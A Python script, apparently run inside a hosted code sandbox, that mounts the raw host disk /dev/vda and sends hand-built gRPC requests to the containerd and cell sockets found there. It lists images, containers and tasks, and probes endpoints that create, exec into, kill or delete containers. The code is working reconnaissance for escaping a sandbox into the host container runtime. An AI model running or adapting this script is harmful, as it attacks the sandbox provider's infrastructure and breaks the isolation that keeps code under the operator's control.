# -*- coding: utf-8 -*-
"""vda27_ctrd_probe: containerd.sock 标准 gRPC 探测
P1: 服务枚举: reflection + Version + Namespaces/List + Images/List + Containers/List + Tasks/List
P2: 根据结果提取镜像名/容器/任务
输出落盘 + 哨兵 V27N_DONE"""
import os, time, socket, ctypes, re, struct

OUT = '/vercel/sandbox/v27n.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rpc_raw(sockpath, path, body, ctype='application/grpc', t=6, shutdown_wr=True, te='trailers'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        if isinstance(body, str):
            body = body.encode()
        hdr = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Content-Length: %d\r\nConnection: close\r\n' % (path, ctype, len(body)))
        if te:
            hdr += 'TE: %s\r\n' % te
        hdr += '\r\n'
        s.sendall(hdr.encode() + body)
        if shutdown_wr:
            try:
                s.shutdown(socket.SHUT_WR)
            except Exception:
                pass
        data = b''
        while True:
            try:
                chunk = s.recv(16384)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:3000].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def grpc_env(payload=b''):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pstr(field_no, s):
    b = s.encode()
    tag = (field_no << 3) | 2
    out = bytearray()
    while tag > 127:
        out.append((tag & 127) | 128)
        tag >>= 7
    out.append(tag)
    l = len(b)
    while l > 127:
        out.append((l & 127) | 128)
        l >>= 7
    out.append(l)
    return bytes(out) + b


def pbool(field_no, v):
    tag = (field_no << 3) | 0
    out = bytearray()
    while tag > 127:
        out.append((tag & 127) | 128)
        tag >>= 7
    out.append(tag)
    out.append(1 if v else 0)
    return bytes(out)


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    csp = '/mnt/vdax/run/cell/containerd.sock'
    # 检查 sock 是否存在
    try:
        st = os.stat(csp)
        log('containerd.sock exists mode=%o' % (st.st_mode & 0o777))
    except Exception as e:
        log('sock check ERR %s' % e)

    # P1: 服务探测
    log('=== P1 containerd services ===')
    probes = [
        ('Version/Version', '/containerd.services.version.v1.Version/Version', b''),
        ('Namespaces/List', '/containerd.services.namespaces.v1.Namespaces/List', b''),
        ('Images/List', '/containerd.services.images.v1.Images/List', b''),
        ('Containers/List', '/containerd.services.containers.v1.Containers/List', b''),
        ('Tasks/List', '/containerd.services.tasks.v1.Tasks/List', b''),
        ('Content/Info empty', '/containerd.services.content.v1.Content/Info', b''),
        ('Snapshots/List', '/containerd.services.snapshots.v1.Snapshots/List', b''),
        ('Leases/List', '/containerd.services.leases.v1.Leases/List', b''),
        ('Introspection/Plugins', '/containerd.services.introspection.v1.Introspection/Plugins', b''),
        ('Health/Check', '/grpc.health.v1.Health/Check', b''),
    ]
    for tag, path, payload in probes:
        st, bd = rpc_raw(csp, path, grpc_env(payload), t=5)
        log('%-22s -> %s | %s' % (tag, st, bd[:400].replace('\n', ' ')))
        time.sleep(0.2)

    # P1b: reflection
    log('=== P1b reflection ===')
    # ServerReflectionInfo 是双向流, 发 FileContainingSymbol 请求
    # reflection request: { file_containing_symbol: "containerd.services.images.v1.Images" }
    refl_req = pstr(1, '')  # placeholder
    # 手工构造: message ServerReflectionRequest { oneof message_request { string file_by_filename=1; string file_containing_symbol=2; ... } }
    req = pstr(2, 'containerd.services.images.v1.Images')
    st, bd = rpc_raw(csp, '/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo', grpc_env(req), t=6)
    log('refl v1alpha -> %s | %s' % (st, bd[:400].replace('\n', ' ')))
    st, bd = rpc_raw(csp, '/grpc.reflection.v1.ServerReflection/ServerReflectionInfo', grpc_env(req), t=6)
    log('refl v1 -> %s | %s' % (st, bd[:400].replace('\n', ' ')))

    # P2: 常见 containerd 服务路径探测 (空请求看错误)
    log('=== P2 more services ===')
    more = [
        ('Tasks/Create', '/containerd.services.tasks.v1.Tasks/Create'),
        ('Tasks/Start', '/containerd.services.tasks.v1.Tasks/Start'),
        ('Tasks/Exec', '/containerd.services.tasks.v1.Tasks/Exec'),
        ('Tasks/Kill', '/containerd.services.tasks.v1.Tasks/Kill'),
        ('Tasks/Delete', '/containerd.services.tasks.v1.Tasks/Delete'),
        ('Images/Get', '/containerd.services.images.v1.Images/Get'),
        ('Containers/Create', '/containerd.services.containers.v1.Containers/Create'),
        ('Containers/Update', '/containerd.services.containers.v1.Containers/Update'),
        ('Containers/Delete', '/containerd.services.containers.v1.Containers/Delete'),
        ('Content/List', '/containerd.services.content.v1.Content/List'),
        ('Diff/Apply', '/containerd.services.diff.v1.Diff/Apply'),
        ('Events/Subscribe', '/containerd.services.events.v1.Events/Subscribe'),
    ]
    for tag, path in more:
        st, bd = rpc_raw(csp, path, grpc_env(b''), t=4)
        log('%-22s -> %s | %s' % (tag, st, bd[:250].replace('\n', ' ')))
        time.sleep(0.15)

    # P3: cell.sock 对照 (确认两个 socket 不同服务)
    log('=== P3 cell.sock vs containerd ===')
    sp2 = '/mnt/vdax/run/cell/cell.sock'
    st, bd = rpc_raw(sp2, '/containerd.services.images.v1.Images/List', grpc_env(b''), t=4)
    log('cell.sock Images/List -> %s | %s' % (st, bd[:200].replace('\n', ' ')))

    log('V27N_DONE')
    f.close()


if __name__ == '__main__':
    main()
